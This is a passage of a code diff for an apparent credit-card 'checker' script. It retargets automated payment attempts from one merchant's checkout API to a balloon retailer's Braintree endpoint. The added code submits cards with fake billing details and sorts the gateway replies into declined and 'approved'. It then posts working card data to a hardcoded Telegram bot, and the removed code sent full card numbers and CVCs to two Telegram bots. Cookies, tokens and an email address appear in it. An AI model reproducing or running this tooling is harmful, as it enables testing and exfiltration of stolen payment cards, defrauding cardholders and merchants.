cf_clearance=FbSHozU5Ng3IlHijtnoDqro8JGHXB1S2tcSuxoifAfE-1736017913-1.2.1.1-RGSrN36li9Sp7LNvjlzT0_236OfZyutjDNI.APUggwHWi5E7_95WHLHS.kLC6QU8TRX42c3UFdqWTgPfRrgKGgMO27GCSYFZvuSnEBsWZj5F18UKdpTm_wOS5x5Gvdz9uFfAd1OgfdLvSodT9ZL73k4uo3JFsno68pIopu0OB_TUMOZ9epXDTC0LlHWaOINGnvTYvwKkgE6xTdn_54JKNlmYqDM_vt1yQLaPWPo1.FFq5xhDcDXPMHnaEOtYe1Fm0rBG4yc93k7avzYbfMDRxodvn48.9X8fA3bePq9tga_WAGkbvNZwhbKi_rirkMrkMeoDTuh5a0bD_fOa9rXftcOOzatoUBu6MNBDVTBekmg_30DLhJFXuMxta_x0lGbsQpO8f6iiLw86XneIY1i23q6elBP596HkKaX..TOazfZ1.yQeDzKGUcrNpqBkmtQZ; _uetsid=b53d41a0cacf11ef80f381283d5f8c94; _uetvid=b6a91d70bf8c11efa9f8a90abb596118; _ga=GA1.2.1287686620.1734779655; SL_C_23361dd035530_SID={"8ca877e1caaaf33fade54d63cfc7b195c4b1c55d":{"sessionId":"6OP5GTG5OPsw8keYbrKuf","visitorId":"hIOU56GuXWpkUirDZ02i-"}}; _dc_gtm_UA-77029243-1=1; private_content_version=96496a2576ec72c73d11342830f4614b; _ga_FPCK13BMBY=GS1.1.1736017889.2.1.1736018012.39.0.0; section_data_ids={%22notify_me%22:1736017932%2C%22cart%22:1736017916%2C%22directory-data%22:1734779670%2C%22gtm%22:1736018011%2C%22captcha%22:1734779817}',
+        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ1NTczMDMiLCJhcCI6IjE1ODg5NzUxMjciLCJpZCI6ImQ3MmYwODk0ZDczYTRiNzUiLCJ0ciI6Ijc5NmI3NjUzMDlkMmIwNmFkNGE5OGQ1ZDBhYWVlNzY0IiwidGkiOjE3MzYwMTgwMzM3MjV9fQ==',
+        'origin': 'https://balloons.online',
+        'referer': 'https://balloons.online/checkout/',
         'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'sec-ch-ua-arch': '""',
+        'sec-ch-ua-bitness': '""',
+        'sec-ch-ua-full-version': '"124.0.6327.4"',
+        'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
         'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-model': '"RMX3700"',
         'sec-ch-ua-platform': '"Android"',
+        'sec-ch-ua-platform-version': '"15.0.0"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
+        'traceparent': '00-796b765309d2b06ad4a98d5d0aaee764-d72f0894d73a4b75-01',
+        'tracestate': '4557303@nr=0-1-4557303-1588975127-d72f0894d73a4b75----1736018033725',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-        'x-csrftoken': 'kHUF/2SaeYof2VV0aUMllJQo6V4=',
+        'x-newrelic-id': 'UAMCVlVTCxABUVNXAAcHU10B',
+        'x-requested-with': 'XMLHttpRequest',
     }
     
     json_data = {
-        'versionInfo': {
-            'moduleVersion': '2kO0xfHUmy5B4kIlM5D_vw',
-            'apiVersion': 'OjcubfFn7YcjWGXofM4rfQ',
-        },
-        'viewName': 'LoggedInFlow_PurchaseProduct.PurchaseProductPayment',
-        'inputParameters': {
-            'Product': {
-                'ProductDetails': {
-                    'ProductId': '1',
-                    'Name': '',
-                    'ProductPrice': '0',
-                    'TotalPrice': '1',
-                    'DiscountPrice': '0',
-                    'Order': 0,
-                    'Description': '',
-                    'Quantity': 0,
+        'cartId': 'WT1KwpgUtvcm5KKCoymkZwpxP8KEyVVb',
+        'billingAddress': {
+            'countryId': 'US',
+            'regionId': '12',
+            'regionCode': 'CA',
+            'region': 'California',
+            'street': [
+                'bsnshjkn',
+                '',
+            ],
+            'company': '',
+            'telephone': num,
+            'postcode': zip_code,
+            'city': city,
+            'firstname': first_name,
+            'lastname': last_name,
+            'extension_attributes': {
+                'delivery_date': '',
+                'time_slot': '',
+                'location_id': '',
+                'shipperhq_option_values': {
+                    'destination_type': '',
+                    'inside_delivery': '0',
+                    'liftgate_required': '0',
+                    'limited_delivery': '0',
+                    'notify_required': '0',
+                    'customer_carrier': '',
+                    'customer_carrier_ph': '',
+                    'customer_carrier_account': '',
                 },
+                'location_address': '',
             },
-            'TokenNonce': tok,
+            'saveInAddressBook': None,
         },
+        'paymentMethod': {
+            'method': 'braintree',
+            'additional_data': {
+                'payment_method_nonce': tok,
+                'device_data': '{"correlation_id":"d9e23d4ad81ffeda7bcd73d2f8f27007"}',
+            },
+        },
+        'email': 'fcodzilla@gmail.com',
     }
     
     response = requests.post(
-        'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
+        'https://balloons.online/rest/balloons_us/V1/guest-carts/WT1KwpgUtvcm5KKCoymkZwpxP8KEyVVb/payment-information',
         cookies=cookies,
         headers=headers,
         json=json_data,
-    ).text
-        
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"versionInfo":{"moduleVersion":"dPmoD0Lswu5LjWnllIRuLw","apiVersion":"OjcubfFn7YcjWGXofM4rfQ"},"viewName":"LoggedInFlow_PurchaseProduct.PurchaseProductPayment","inputParameters":{"Product":{"ProductDetails":{"ProductId":"1","Name":"","ProductPrice":"0","TotalPrice":"21","DiscountPrice":"0","Order":0,"Description":"","Quantity":0}},"TokenNonce":"tokencc_bh_n8fwyx_xjq9zc_h4yvtf_mkjsdp_bz6"}}'
-#response = requests.post(
-#    'https://www.lifehub.sg/screenservices/NewApollo/LoggedInFlow_PurchaseProduct/PurchaseProductPayment/ActionStep2_GetProductPaymentTokenFor3DS',
-#    cookies=cookies,
-#    headers=headers,
-#    data=data,
-#)
+    )
+	
+    #
     end_time = time.time()
     elapsed_time = round(end_time - start_time, 2)
-    #print(P,'>>',response.text)
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-			
-    if 'Do Not Honor' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2000: 𝗗σ 𝗡σт 𝗛σиσя ❌ > ')
-    	
-    elif 'Closed Card' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2108: 𝗖ℓσѕє𝗗 𝗖αя𝗗 ❌ > ')
-	
-    elif 'No Account' in response:
-	    print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2007: 𝗡σ 𝗔𝗰𝗰συит ❌ > ')
-
-    elif 'Call Issuer. Pick Up Card.' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2047: 𝗣ι𝗰к 𝗨ρ 𝗖αя𝗗 ❌ > ')
-    	
-    elif 'Transaction Not Allowed' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2015: Transaction Not Allowed ❌ > ')
-    	
     
-    elif 'Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid.' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid. ❌ > ')
+    #print(P,'->>',response.json()['message'])
+    if 'Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Policy)' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖αииσт 𝗔υтнσяιzє 𝗔т 𝗧нιѕ 𝗧ιмє ( 𝗣σℓι𝗰у ) ❌
 
-    
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
 
-    elif 'Cannot Authorize at this time (Policy)' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2106: 𝗖αииσт 𝗔υтнσяιzє 𝗔т 𝗧нιѕ 𝗧ιмє ( 𝗣σℓι𝗰у ) ❌ > ')
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Expired Card' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗘χριяє𝗗 𝗖αя𝗗 ❌
 
-    elif 'Expired Card' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2106: ExpireD CarD ❌ > ')
-    	
-    elif 'Processor Declined' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2038: Processor Declined ❌ > ')
-    	
-    elif 'Issuer or Cardholder has put a restriction on the card' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2057: Issuer or Cardholder has put a restriction on the card ❌ > ')
-    	
-    elif 'Violation' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2057: Issuer or Cardholder has put a restriction on the card ❌ > ')
-    	
-    elif 'Gateway Rejected: risk_threshold' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: Issuer or Cardholder has put a restriction on the card ❌ > ')
-    	
-    elif 'Cannot Authorize at this time (Life cycle)' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2097: Cannot Authorize at this time (Life cycle) ❌ > ')
-    	
-    elif 'Declined - Call Issuer' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2044: Declined - Call Issuer ❌ > ')
-    	
-    elif 'Processor Declined - Fraud Suspected' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2014: Processor Declined - Fraud Suspected ❌ > ')
-    	
-    elif 'Invalid Merchant ID' in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2026: Invalid Merchant ID ❌ > ')
-    	
-    
-    elif "Credit card type is not accepted by this merchant account.[Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] Credit card type is not accepted by this merchant account." in response:
-    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: [Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] ❌ > ')
-    	
-    if 'CHARGED' in response or 'avs' in response or 'postal' in response or 'approved' in response or 'Nice!' in response or 'Approved' in response or 'Duplicate' in response or 'Successful' in response or 'successful' in response or 'Thank you' in response or 'confirmed' in response or 'successfully' in response:
-        print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')
-    	
-    elif "Insufficient Funds" in response:
-        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < Google Play ✅ > ')
-        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> Insufficient Funds ✅ 
-        ID -> {id}
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> Insufficient Funds ✅ 
-        ID -> tg://openmessage?user_id={id}
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        
-    elif 'Card Issuer Declined CVV' in response:
-    	print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < 2010: 𝗖𝗖𝗡 ✅ > < Just Try The Sites ✅ > ')
-    	requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅ 
-        ID -> {id}
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""");requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅ 
-        ID -> tg://openmessage?user_id={id}
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        
-        
-    	
-        
-        
-    elif 'Gateway Rejected: cvv' in response:
-        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > < Google Play ✅ > ')
-        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > ✅ 
-        ID -> {id}
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > ✅ 
-        ID -> tg://openmessage?user_id={id}
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        
-    elif 'CVV must be 4 digits for American Express and 3 digits for other card types.' in response:
-        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < ✅ > < ترويج انستاغرام  ✅ > ')
-        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> ترويج انستا ✅ 
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
-    	  Bιи -> {P[:6]} 
-    	  Gαтєωαу -> Braintree Auth
-        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> ترويج انستا ✅ 
-        ID -> tg://openmessage?user_id={id}
-        
-       Uѕєя αgєит -> {user}
-	        Tιмє -> {elapsed_time} SєcσиDѕ .  
-	        
-	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
-        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
-        
-    #
-        
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
 
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Call Issuer. Pick Up Card.' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗣ι𝗰к 𝗨ρ 𝗖αя𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. No Account' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗡σ 𝗔𝗰𝗰συит ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Closed Card' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖ℓσѕє𝗗 𝗖αя𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV' in response.text:
+    	print(f'''𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖𝗖𝗡 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    	requests.post(f"""https://api.telegram.org/bot6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg/sendmessage?chat_id=5123986264&text=
+𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖𝗖𝗡 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Processor Declined - Fraud Suspected' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗣яσ𝗰єѕѕσя 𝗗є𝗰ℓιиє𝗗 - 𝗙яαυ𝗗 𝗦υѕρє𝗰тє𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Declined - Call Issuer' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗗є𝗰ℓιиє𝗗 𝗖αℓℓ 𝗜ѕѕυєя ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds' in response.text:
+    	print(f'''𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗗συρℓє 𝗔ρρяσνє𝗗 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+
+    	requests.post(f"""https://api.telegram.org/bot6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg/sendmessage?chat_id=5123986264&text=
+𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗔ρρяσνє𝗗 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Do Not Honor' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌    
+            
+𝗖αя𝗗 -> {P}    
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗗σ 𝗡σт 𝗛σиσя ❌    
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .    
+
+𝗣яσɢяαммεя -> @B_6_Q ~    
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Issuer or Cardholder has put a restriction on the card' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗜ѕѕυєя 𝗢я 𝗖αя𝗗 𝗛αѕ 𝗣υт 𝗔 𝗥єѕтяι𝗰тισи 𝗢и 𝗧нє 𝗖αя𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Transaction Not Allowed' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗧яαиѕα𝗰тισи 𝗡σт 𝗔ℓℓσωє𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Life cycle)' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖αииσт 𝗔υтнσяιzє 𝗔т 𝗧нιѕ 𝗧ιмє ( 𝗟ιfє 𝗖у𝗰ℓє ) ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. No Such Issuer' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗡σ 𝗦υ𝗰н 𝗜ѕѕυєя ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Payment instrument type is not accepted by this merchant account.' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗡σиє 🧿
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Processor Declined' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗣яσ𝗰єѕѕєя 𝗗є𝗰ℓιиє𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Card Not Activated' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗖αя𝗗 𝗡σт 𝗔𝗰тιναтє𝗗 ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Invalid Transaction' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗜иναℓι𝗗 𝗧яαиѕα𝗰тισи ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: risk_threshold' in response.text:
+    	print(f'''𝗗є𝗰ℓιиє𝗗 ❌
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗥ιѕк: 𝗥єтяу 𝗧нιѕ 𝗕ιи 𝗟αтєя ❌
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. Credit card number is prohibited.' in response.text:
+    	print(f'''𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗔ρρяσνє𝗗 𝗖яє𝗗ιт 𝗖αя𝗗 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
+    	requests.post(f"""https://api.telegram.org/bot6913577462:AAELQiwLjFjeKZgR2DXu4KXMPOnDoPAYkGg/sendmessage?chat_id=5123986264&text=
+𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 𝗔ρρяσνє𝗗 𝗖яє𝗗ιт 𝗖αя𝗗 ✅
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+Join My Channels >> https://t.me/+UO1DPQYFMcpkY2Y0
+
+𝗣яσɢяαммεя -> @B_6_Q ~""")
+    	
+    elif 'Your payment could not be taken. Please try again or use a different payment method. CVV must be 4 digits for American Express and 3 digits for other card types.' in response.text:
+    	print(f'''𝗔ρρяσνє𝗗 ✅
+            
+𝗖αя𝗗 -> {P}
+𝗚αтєωαу -> 𝗨икиσωи 💋    
+𝗥єѕρσиѕє -> 💀
+
+𝗠єѕѕαgє 𝗙яσм 𝗠σ𝗗𝗰α : جربها ترويج انستا
+
+𝗧ιмє {elapsed_time} 𝗦є𝗰σи𝗗ѕ .
+
+𝗣яσɢяαммεя -> @B_6_Q ~
+''')
